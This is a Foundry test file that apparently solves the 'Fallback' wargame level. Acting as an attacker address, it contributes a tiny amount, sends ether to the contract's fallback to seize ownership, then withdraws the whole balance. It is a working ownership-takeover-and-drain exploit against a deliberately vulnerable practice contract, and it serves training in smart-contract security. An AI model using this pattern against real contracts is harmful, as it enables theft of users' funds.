// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";
import "../src/levels/Fallback/Fallback.sol";
import "../src/levels/Fallback/FallbackFactory.sol";

contract FallbackTest is Test {
    FallbackFactory public factory;
    address payable public fallbackContract;
    address public player = address(0x01);
    address public attacker = address(0x02);

    function setUp() public {
        factory = new FallbackFactory();
        fallbackContract = payable(factory.createInstance(player));

        log_address(Fallback(fallbackContract).owner());
        log_address(Fallback(fallbackContract).owner());
    }

    function testFallbackAttack() public {
        // SETUP
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);

        // EXPLOIT
        Fallback(fallbackContract).contribute{value: 1}();
        (bool success,) = fallbackContract.call{value: 1}("");

        if (success) {
            Fallback(fallbackContract).withdraw();
            assertTrue(factory.validateInstance(fallbackContract, attacker));
        }
        assertEq(fallbackContract.balance, 0);

        log_uint(attacker.balance);
        log_address(Fallback(fallbackContract).owner());
    }
}
